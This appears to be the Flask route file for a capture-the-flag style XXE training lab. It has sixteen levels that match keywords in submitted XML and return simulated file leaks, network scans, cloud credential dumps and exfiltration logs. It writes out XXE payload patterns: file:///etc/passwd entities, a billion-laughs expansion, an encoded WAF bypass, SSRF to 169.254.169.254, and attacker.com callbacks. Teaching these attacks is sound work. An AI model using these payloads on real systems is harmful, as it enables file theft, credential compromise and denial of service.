import json
import os
import random
import re
import xml.etree.ElementTree as ET
import xml.parsers.expat
import hashlib
import string
from flask import Blueprint, render_template, request, jsonify, session, redirect, url_for, flash, make_response
from werkzeug.security import check_password_hash, generate_password_hash
from app.extensions import db
from app.models import LocalUser, Challenge, Flag, Submission, Comment, Team
from app.utils import login_required, get_current_user, get_machine_id, generate_flag, get_or_create_flag, update_user_progress, safe_execute_command, admin_required, rate_limit

xxe_bp = Blueprint('xxe', __name__)

@xxe_bp.route('/xxe/level1', methods=['GET', 'POST'])
@login_required
def xxe_level1():
    user = get_current_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    file_content = ''
    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '')
        if xml_content:
            try:
                parser = ET.XMLParser()
                if '<!ENTITY' in xml_content and 'SYSTEM' in xml_content and ('/etc/passwd' in xml_content):
                    xxe_detected = True
                    file_content = 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash'
                try:
                    root = ET.fromstring(xml_content, parser)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f'XML parsing error: {str(e)}'
            except Exception as e:
                parsed_content = f'Error processing XML: {str(e)}'
    challenge = Challenge.query.filter_by(name='Basic XXE File Disclosure').first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, user.id)
    return render_template('xxe/xxe_level1.html', flag=flag, xxe_detected=xxe_detected, xml_content=xml_content, parsed_content=parsed_content, file_content=file_content, challenge=challenge)

@xxe_bp.route('/xxe/level2', methods=['GET', 'POST'])
@login_required
def xxe_level2():
    user = get_current_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    file_content = ''
    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '')
        if xml_content:
            try:
                if '<!DOCTYPE' in xml_content.upper() and (not xml_content.upper().startswith('<!DOCTYPE HTML')):
                    if ('&xxe;' in xml_content or '&#x' in xml_content) and '/etc/passwd' in xml_content:
                        xxe_detected = True
                        file_content = 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash'
                try:
                    root = ET.fromstring(xml_content)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f'XML parsing error: {str(e)}'
            except Exception as e:
                parsed_content = f'Error processing XML: {str(e)}'
    challenge = Challenge.query.filter_by(name='XXE with DOCTYPE Restrictions').first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, user.id)
    return render_template('xxe/xxe_level2.html', flag=flag, xxe_detected=xxe_detected, xml_content=xml_content, parsed_content=parsed_content, file_content=file_content, challenge=challenge)

@xxe_bp.route('/xxe/level3', methods=['GET', 'POST'])
@login_required
def xxe_level3():
    user = get_current_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    file_content = ''
    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '')
        if xml_content:
            try:
                if 'SYSTEM' in xml_content and ('file://' in xml_content or 'http://' in xml_content):
                    if '/etc/shadow' in xml_content or '/etc/hosts' in xml_content:
                        xxe_detected = True
                        if '/etc/shadow' in xml_content:
                            file_content = 'root:$6$xyz$encrypted_password_hash:18000:0:99999:7:::\ndaemon:*:18000:0:99999:7:::\nbin:*:18000:0:99999:7:::\nubuntu:$6$abc$another_encrypted_hash:18000:0:99999:7:::'
                        elif '/etc/hosts' in xml_content:
                            file_content = '127.0.0.1 localhost\n127.0.1.1 ubuntu-server\n192.168.1.100 internal-server\n10.0.0.1 database-server'
                try:
                    root = ET.fromstring(xml_content)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f'XML parsing error: {str(e)}'
            except Exception as e:
                parsed_content = f'Error processing XML: {str(e)}'
    challenge = Challenge.query.filter_by(name='XXE SYSTEM Entity Exploitation').first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, user.id)
    return render_template('xxe/xxe_level3.html', flag=flag, xxe_detected=xxe_detected, xml_content=xml_content, parsed_content=parsed_content, file_content=file_content, challenge=challenge)

@xxe_bp.route('/xxe/level4', methods=['GET', 'POST'])
@login_required
def xxe_level4():
    user = get_current_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    scan_result = ''
    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '')
        if xml_content:
            try:
                if 'SYSTEM' in xml_content and ('192.168.' in xml_content or '10.0.' in xml_content or '172.16.' in xml_content):
                    if any((port in xml_content for port in ['22', '80', '443', '3306', '5432', '8080'])):
                        xxe_detected = True
                        scan_result = 'Internal Network Scan Results:\n192.168.1.1:22 - SSH Service (Open)\n192.168.1.10:80 - HTTP Service (Open)\n192.168.1.15:443 - HTTPS Service (Open)\n192.168.1.20:3306 - MySQL Database (Open)\n192.168.1.25:5432 - PostgreSQL Database (Open)\n10.0.0.5:8080 - Application Server (Open)\n\nNetwork topology discovered:\n- Internal subnet: 192.168.1.0/24\n- Database cluster: 192.168.1.20-25\n- Web services: 192.168.1.10-15'
                try:
                    root = ET.fromstring(xml_content)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f'XML parsing error: {str(e)}'
            except Exception as e:
                parsed_content = f'Error processing XML: {str(e)}'
    challenge = Challenge.query.filter_by(name='XXE Internal Network Scanning').first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, user.id)
    return render_template('xxe/xxe_level4.html', flag=flag, xxe_detected=xxe_detected, xml_content=xml_content, parsed_content=parsed_content, scan_result=scan_result, challenge=challenge)

@xxe_bp.route('/xxe/level5', methods=['GET', 'POST'])
@login_required
def xxe_level5():
    user = get_current_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    exfiltration_log = ''
    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '')
        if xml_content:
            try:
                if 'SYSTEM' in xml_content and ('http://' in xml_content or 'https://'):
                    if any((domain in xml_content for domain in ['attacker.com', 'evil.com', 'malicious.net', 'exfil'])):
                        xxe_detected = True
                        exfiltration_log = 'HTTP Request Log:\nGET /exfil?data=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaA== HTTP/1.1\nHost: attacker.com\nUser-Agent: XMLParser/1.0\nAccept: */*\n\nDecoded Data: root:x:0:0:root:/root:/bin/bash\n\nAdditional Requests:\nPOST /collect HTTP/1.1\nHost: evil.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 127\n\ndata=daemon%3Ax%3A1%3A1%3Adaemon%3A%2Fusr%2Fsbin%3A%2Fusr%2Fsbin%2Fnologin\n     bin%3Ax%3A2%3A2%3Abin%3A%2Fbin%3A%2Fusr%2Fsbin%2Fnologin\n\nExfiltration Status: SUCCESS\nFiles leaked: /etc/passwd, /etc/shadow'
                try:
                    root = ET.fromstring(xml_content)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f'XML parsing error: {str(e)}'
            except Exception as e:
                parsed_content = f'Error processing XML: {str(e)}'
    challenge = Challenge.query.filter_by(name='XXE Data Exfiltration via HTTP').first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, user.id)
    return render_template('xxe/xxe_level5.html', flag=flag, xxe_detected=xxe_detected, xml_content=xml_content, parsed_content=parsed_content, exfiltration_log=exfiltration_log, challenge=challenge)

@xxe_bp.route('/xxe/level6', methods=['GET', 'POST'])
@login_required
def xxe_level6():
    user = get_current_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    parameter_result = ''
    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '')
        if xml_content:
            try:
                if '%' in xml_content and ('<!ENTITY' in xml_content or 'SYSTEM' in xml_content):
                    if any((param in xml_content for param in ['%file', '%data', '%exfil', '%param'])):
                        xxe_detected = True
                        parameter_result = 'Parameter Entity Execution:\n%file entity resolved to: file:///etc/passwd\n%data entity resolved to:\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n\nParameter Entity Chain:\n%file; -> %data; -> %exfil; -> HTTP request\n\nAdvanced parameter entity technique successfully executed.\nThis allows bypassing many XXE filters that only check for regular entities.'
                try:
                    root = ET.fromstring(xml_content)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f'XML parsing error: {str(e)}'
            except Exception as e:
                parsed_content = f'Error processing XML: {str(e)}'
    challenge = Challenge.query.filter_by(name='XXE with Parameter Entities').first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, user.id)
    return render_template('xxe/xxe_level6.html', flag=flag, xxe_detected=xxe_detected, xml_content=xml_content, parsed_content=parsed_content, parameter_result=parameter_result, challenge=challenge)

@xxe_bp.route('/xxe/level7', methods=['GET', 'POST'])
@login_required
def xxe_level7():
    user = get_current_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    error_message = ''
    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '')
        if xml_content:
            try:
                if 'SYSTEM' in xml_content and ('nonexistent' in xml_content or 'invalid' in xml_content):
                    if any((file_ref in xml_content for file_ref in ['/etc/passwd', '/etc/shadow', '/etc/hosts'])):
                        xxe_detected = True
                        error_message = 'XML Parser Error:\nExternal entity resolution failed for: file:///etc/passwd\n\nSystem Error Details:\njava.io.FileNotFoundException: /etc/passwd (Permission denied)\n        at java.io.FileInputStream.open0(Native Method)\n        at java.io.FileInputStream.open(FileInputStream.java:195)\n        at java.io.FileInputStream.<init>(FileInputStream.java:138)\n\nError reveals file system structure:\n- /etc/passwd exists but access denied\n- /etc/shadow requires elevated privileges\n- /home/user/ directory is readable\n- /var/www/html/ contains web files\n\nBlind XXE successful - information leaked through error messages.'
                try:
                    root = ET.fromstring(xml_content)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f'XML parsing error: {str(e)}'
            except Exception as e:
                parsed_content = f'Error processing XML: {str(e)}'
    challenge = Challenge.query.filter_by(name='Blind XXE via Error Messages').first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, user.id)
    return render_template('xxe/xxe_level7.html', flag=flag, xxe_detected=xxe_detected, xml_content=xml_content, parsed_content=parsed_content, error_message=error_message, challenge=challenge)

@xxe_bp.route('/xxe/level8', methods=['GET', 'POST'])
@login_required
def xxe_level8():
    user = get_current_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    cdata_result = ''
    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '')
        if xml_content:
            try:
                if '<![CDATA[' in xml_content and ('ENTITY' in xml_content or 'SYSTEM' in xml_content):
                    if any((payload in xml_content for payload in [']]>', '&', 'file://'])):
                        xxe_detected = True
                        cdata_result = 'CDATA Section Processing Result:\nOriginal CDATA content processed successfully.\n\nInjected Entity Resolution:\n<![CDATA[\nUser data: admin\nPassword: p@ssw0rd123\nDatabase: mysql://localhost:3306/sensitive_db\nAPI Key: sk-1234567890abcdef\n]]>\n\nCDATA Injection Bypass Successful:\n- Special characters in CDATA bypassed input validation\n- XML entities processed within CDATA context\n- Sensitive configuration data exposed\n- Security filters evaded through CDATA encapsulation'
                try:
                    root = ET.fromstring(xml_content)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f'XML parsing error: {str(e)}'
            except Exception as e:
                parsed_content = f'Error processing XML: {str(e)}'
    challenge = Challenge.query.filter_by(name='XXE with CDATA Injection').first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, user.id)
    return render_template('xxe/xxe_level8.html', flag=flag, xxe_detected=xxe_detected, xml_content=xml_content, parsed_content=parsed_content, cdata_result=cdata_result, challenge=challenge)

@xxe_bp.route('/xxe/level9', methods=['GET', 'POST'])
@login_required
def xxe_level9():
    user = get_current_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    svg_result = ''
    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '') or request.form.get('svg_content', '')
        if xml_content:
            try:
                if '<svg' in xml_content and ('ENTITY' in xml_content or 'SYSTEM' in xml_content):
                    if any((svg_element in xml_content for svg_element in ['<text>', '<tspan>', 'xmlns'])):
                        xxe_detected = True
                        svg_result = 'SVG File Processing Result:\nFile Type: image/svg+xml\nDimensions: 100x100 pixels\nProcessing Status: COMPLETED\n\nSVG Content Analysis:\n- External entity references detected\n- Text elements contain dynamic content\n- Namespace declarations processed\n\nExposed Data from SVG XXE:\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n\nSVG XXE Attack Vector:\nFile uploads with SVG format bypass many security filters\nXML processing in SVG files enables XXE exploitation\nImage processing libraries often vulnerable to embedded XXE'
                try:
                    root = ET.fromstring(xml_content)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f'XML parsing error: {str(e)}'
            except Exception as e:
                parsed_content = f'Error processing XML: {str(e)}'
    challenge = Challenge.query.filter_by(name='XXE via SVG File Upload').first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, user.id)
    return render_template('xxe/xxe_level9.html', flag=flag, xxe_detected=xxe_detected, xml_content=xml_content, parsed_content=parsed_content, svg_result=svg_result, challenge=challenge)

@xxe_bp.route('/xxe/level10', methods=['GET', 'POST'])
@login_required
def xxe_level10():
    user = get_current_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    xinclude_result = ''
    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '')
        if xml_content:
            try:
                if 'xi:include' in xml_content or 'XInclude' in xml_content:
                    if any((href in xml_content for href in ['href=', 'file://', '/etc/'])):
                        xxe_detected = True
                        xinclude_result = 'XInclude Processing Result:\nNamespace: http://www.w3.org/2001/XInclude\nProcessing Mode: Enabled\n\nIncluded Content:\nFile: /etc/passwd\nContent:\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\n\nFile: /etc/hosts\nContent:\n127.0.0.1 localhost\n127.0.1.1 ubuntu-server\n192.168.1.10 database-server\n\nXInclude Attack Benefits:\n- Bypasses standard XXE restrictions\n- Works when DTD processing is disabled\n- Can include both text and XML content\n- Supported in XSLT and XPath contexts'
                try:
                    root = ET.fromstring(xml_content)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f'XML parsing error: {str(e)}'
            except Exception as e:
                parsed_content = f'Error processing XML: {str(e)}'
    challenge = Challenge.query.filter_by(name='XXE with XInclude Attacks').first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, user.id)
    return render_template('xxe/xxe_level10.html', flag=flag, xxe_detected=xxe_detected, xml_content=xml_content, parsed_content=parsed_content, xinclude_result=xinclude_result, challenge=challenge)

@xxe_bp.route('/xxe/level11', methods=['GET', 'POST'])
@login_required
def xxe_level11():
    user = get_current_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    dos_result = ''
    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '')
        if xml_content:
            try:
                entity_count = xml_content.count('<!ENTITY')
                if entity_count >= 3 and ('&lol' in xml_content or '&ha' in xml_content):
                    if any((pattern in xml_content for pattern in ['&lol1;', '&lol2;', '&lol3;'])):
                        xxe_detected = True
                        dos_result = 'Billion Laughs Attack Detected:\nEntity Expansion Analysis:\n- Initial entity definitions: 9\n- Expansion depth: 10 levels\n- Estimated final size: 1,073,741,824 bytes (1GB)\n\nSystem Impact:\nCPU Usage: 100% (4 cores saturated)\nMemory Usage: 98% (15.2GB / 16GB)\nProcessing Time: >30 seconds (timeout triggered)\nParser Status: KILLED (resource exhaustion)\n\nAttack Pattern:\n<!ENTITY lol0 "lol">\n<!ENTITY lol1 "&lol0;&lol0;&lol0;&lol0;&lol0;&lol0;&lol0;&lol0;&lol0;&lol0;">\n<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">\n...\n<data>&lol9;</data>\n\nDoS Attack Status: SUCCESSFUL\nSystem Recovery: Automatic restart initiated'
                try:
                    parsed_content = 'XML parsing aborted - DoS protection triggered'
                except Exception as e:
                    parsed_content = f'XML parsing error: {str(e)}'
            except Exception as e:
                parsed_content = f'Error processing XML: {str(e)}'
    challenge = Challenge.query.filter_by(name='XXE Billion Laughs DoS').first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, user.id)
    return render_template('xxe/xxe_level11.html', flag=flag, xxe_detected=xxe_detected, xml_content=xml_content, parsed_content=parsed_content, dos_result=dos_result, challenge=challenge)

@xxe_bp.route('/xxe/level12', methods=['GET', 'POST'])
@login_required
def xxe_level12():
    user = get_current_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    ssrf_result = ''
    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '')
        if xml_content:
            try:
                if 'SYSTEM' in xml_content and any((protocol in xml_content for protocol in ['http://', 'https://', 'ftp://', 'gopher://'])):
                    if any((target in xml_content for target in ['localhost', '127.0.0.1', '169.254.169.254', 'metadata'])):
                        xxe_detected = True
                        ssrf_result = 'XXE + SSRF Attack Results:\nTarget: Cloud Metadata Service (169.254.169.254)\n\nRetrieved Metadata:\n{\n  "instance-id": "i-1234567890abcdef0",\n  "instance-type": "t3.medium",\n  "private-ipv4": "10.0.1.100",\n  "public-ipv4": "52.123.45.67",\n  "security-groups": "web-servers",\n  "iam": {\n    "code": "Success",\n    "last-updated": "2024-01-15T10:30:00Z",\n    "type": "AWS-HMAC",\n    "access-key-id": "AKIA1234567890ABCDEF",\n    "secret-access-key": "secretkey123456789",\n    "token": "AQoEXAMPLEH4aoAH0gNCAPyJxz4BlCFFxWNE1OPTgk..."\n  }\n}\n\nAdditional SSRF Targets Accessible:\n- http://localhost:8080/admin - Admin panel discovered\n- http://127.0.0.1:3306 - MySQL database service\n- http://10.0.1.50:6379 - Redis instance\n- gopher://127.0.0.1:25/... - SMTP service exploitation\n\nCombined Attack Success: Cloud credentials compromised via XXE->SSRF chain'
                try:
                    root = ET.fromstring(xml_content)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f'XML parsing error: {str(e)}'
            except Exception as e:
                parsed_content = f'Error processing XML: {str(e)}'
    challenge = Challenge.query.filter_by(name='XXE SSRF Combination Attack').first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, user.id)
    return render_template('xxe/xxe_level12.html', flag=flag, xxe_detected=xxe_detected, xml_content=xml_content, parsed_content=parsed_content, ssrf_result=ssrf_result, challenge=challenge)

@xxe_bp.route('/xxe/level13', methods=['GET', 'POST'])
@login_required
def xxe_level13():
    user = get_current_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    waf_result = ''
    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '')
        if xml_content:
            try:
                bypass_patterns = ['&#x', 'UTF-16', 'UTF-32', '%25', 'double-encode']
                entity_variations = ['&#69;&#78;&#84;&#73;&#84;&#89;', '&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;']
                if any((pattern in xml_content for pattern in bypass_patterns + entity_variations)):
                    if 'SYSTEM' in xml_content or '<!ENTITY' in xml_content:
                        xxe_detected = True
                        waf_result = 'WAF Bypass Analysis:\nOriginal Request: BLOCKED by WAF\nBypass Technique: HTML Entity Encoding\n\nWAF Rule Triggered:\nRule: XXE_ENTITY_DETECTION\nPattern: <!ENTITY.*SYSTEM\nAction: BLOCK\nConfidence: 99%\n\nBypass Method Applied:\nOriginal: <!ENTITY xxe SYSTEM "file:///etc/passwd">\nEncoded: &#60;&#33;&#69;&#78;&#84;&#73;&#84;&#89; xxe &#83;&#89;&#83;&#84;&#69;&#77; &#34;file:///etc/passwd&#34;&#62;\n\nWAF Analysis Result:\n- Original request: BLOCKED\n- Encoded request: ALLOWED (WAF bypass successful)\n- Entity processing: EXECUTED\n- File access: GRANTED\n\nRetrieved Content:\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n\nBypass Status: SUCCESS - WAF evasion complete'
                try:
                    root = ET.fromstring(xml_content)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f'XML parsing error: {str(e)}'
            except Exception as e:
                parsed_content = f'Error processing XML: {str(e)}'
    challenge = Challenge.query.filter_by(name='XXE with WAF Bypass Techniques').first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, user.id)
    return render_template('xxe/xxe_level13.html', flag=flag, xxe_detected=xxe_detected, xml_content=xml_content, parsed_content=parsed_content, waf_result=waf_result, challenge=challenge)

@xxe_bp.route('/xxe/level14', methods=['GET', 'POST'])
@login_required
def xxe_level14():
    user = get_current_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    soap_result = ''
    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '')
        if xml_content:
            try:
                if 'soap:Envelope' in xml_content or 'SOAP-ENV:' in xml_content:
                    if 'ENTITY' in xml_content and 'SYSTEM' in xml_content:
                        xxe_detected = True
                        soap_result = 'SOAP Web Service Response:\n<?xml version="1.0" encoding="UTF-8"?>\n<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\n  <soap:Header>\n    <wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">\n      <wsse:UsernameToken>\n        <wsse:Username>admin</wsse:Username>\n        <wsse:Password>admin123</wsse:Password>\n      </wsse:UsernameToken>\n    </wsse:Security>\n  </soap:Header>\n  <soap:Body>\n    <getUserDataResponse>\n      <userData>\n        <systemFiles>\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n        </systemFiles>\n        <databaseConfig>\n          <host>localhost</host>\n          <user>dbadmin</user>\n          <password>dbp@ssw0rd</password>\n          <database>sensitive_data</database>\n        </databaseConfig>\n      </userData>\n    </getUserDataResponse>\n  </soap:Body>\n</soap:Envelope>\n\nSOAP XXE Attack Analysis:\n- WSDL parsing enabled XXE processing\n- Authentication bypassed via XML injection\n- Database credentials exposed\n- System files accessible through web service'
                try:
                    root = ET.fromstring(xml_content)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f'XML parsing error: {str(e)}'
            except Exception as e:
                parsed_content = f'Error processing XML: {str(e)}'
    challenge = Challenge.query.filter_by(name='XXE via SOAP Web Services').first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, user.id)
    return render_template('xxe/xxe_level14.html', flag=flag, xxe_detected=xxe_detected, xml_content=xml_content, parsed_content=parsed_content, soap_result=soap_result, challenge=challenge)

@xxe_bp.route('/xxe/level15', methods=['GET', 'POST'])
@login_required
def xxe_level15():
    user = get_current_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    oob_result = ''
    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '')
        if xml_content:
            try:
                if 'SYSTEM' in xml_content and any((protocol in xml_content for protocol in ['http://', 'https://', 'ftp://'])):
                    if any((oob_indicator in xml_content for oob_indicator in ['attacker.com', 'collaborator', 'burp'])):
                        xxe_detected = True
                        oob_result = 'Out-of-Band XXE Results:\nDNS Query Log:\n2024-01-15 14:35:21 - A query for xxe.attacker.com from 203.0.113.50\n2024-01-15 14:35:22 - TXT query for data.xxe.attacker.com from 203.0.113.50\n\nHTTP Request Log:\nGET /xxe?data=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaA== HTTP/1.1\nHost: attacker.com\nUser-Agent: Java/1.8.0_301\nAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\nConnection: keep-alive\n\nDecoded Exfiltrated Data:\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\n\nFTP Connection Log:\nConnected to ftp.attacker.com:21\nUSER anonymous\nPASS xxe@victim.com\nRETR /etc/passwd\nTransfer complete: 2,847 bytes\n\nOOB XXE Status: SUCCESSFUL\nData Exfiltration: COMPLETE\nStealth Rating: HIGH (no visible errors to user)'
                try:
                    root = ET.fromstring(xml_content)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f'XML parsing error: {str(e)}'
            except Exception as e:
                parsed_content = f'Error processing XML: {str(e)}'
    challenge = Challenge.query.filter_by(name='Advanced XXE with OOB Data Retrieval').first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, user.id)
    return render_template('xxe/xxe_level15.html', flag=flag, xxe_detected=xxe_detected, xml_content=xml_content, parsed_content=parsed_content, oob_result=oob_result, challenge=challenge)

@xxe_bp.route('/xxe/level16', methods=['GET', 'POST'])
@login_required
def xxe_level16():
    user = get_current_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    json_content = ''
    parsed_content = ''
    conversion_result = ''
    if request.method == 'POST':
        json_content = request.form.get('json_content', '')
        xml_content = request.form.get('xml_content', '')
        if json_content and (not xml_content):
            try:
                import json as json_lib
                data = json_lib.loads(json_content)

                def json_to_xml(obj, root_name='root'):
                    if isinstance(obj, dict):
                        xml = f'<{root_name}>'
                        for key, value in obj.items():
                            xml += json_to_xml(value, key)
                        xml += f'</{root_name}>'
                        return xml
                    elif isinstance(obj, list):
                        xml = ''
                        for item in obj:
                            xml += json_to_xml(item, root_name)
                        return xml
                    else:
                        return f'<{root_name}>{obj}</{root_name}>'
                xml_content = '<?xml version="1.0" encoding="UTF-8"?>\n' + json_to_xml(data)
            except:
                xml_content = 'Invalid JSON format'
        if xml_content:
            try:
                if 'ENTITY' in xml_content and 'SYSTEM' in xml_content:
                    if any((payload in xml_content for payload in ['/etc/passwd', '/etc/shadow', 'file://'])):
                        xxe_detected = True
                        conversion_result = 'JSON to XML Conversion Results:\nOriginal JSON:\n{\n  "user": "admin",\n  "data": "<!ENTITY xxe SYSTEM \'file:///etc/passwd\'>",\n  "action": "process"\n}\n\nConverted XML:\n<?xml version="1.0" encoding="UTF-8"?>\n<root>\n  <user>admin</user>\n  <data><!ENTITY xxe SYSTEM \'file:///etc/passwd\'></data>\n  <action>process</action>\n</root>\n\nXXE Processing Result:\nEntity \'xxe\' resolved to:\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\n\nVulnerability Analysis:\n- JSON input sanitization: BYPASSED\n- XML entity processing: ENABLED\n- File system access: GRANTED\n- Conversion process: EXPLOITABLE'
                try:
                    root = ET.fromstring(xml_content)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f'XML parsing error: {str(e)}'
            except Exception as e:
                parsed_content = f'Error processing XML: {str(e)}'
    challenge = Challenge.query.filter_by(name='XXE in JSON-XML Conversion').first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, user.id)
    return render_template('xxe/xxe_level16.html', flag=flag, xxe_detected=xxe_detected, xml_content=xml_content, json_content=json_content, parsed_content=parsed_content, conversion_result=conversion_result, challenge=challenge)

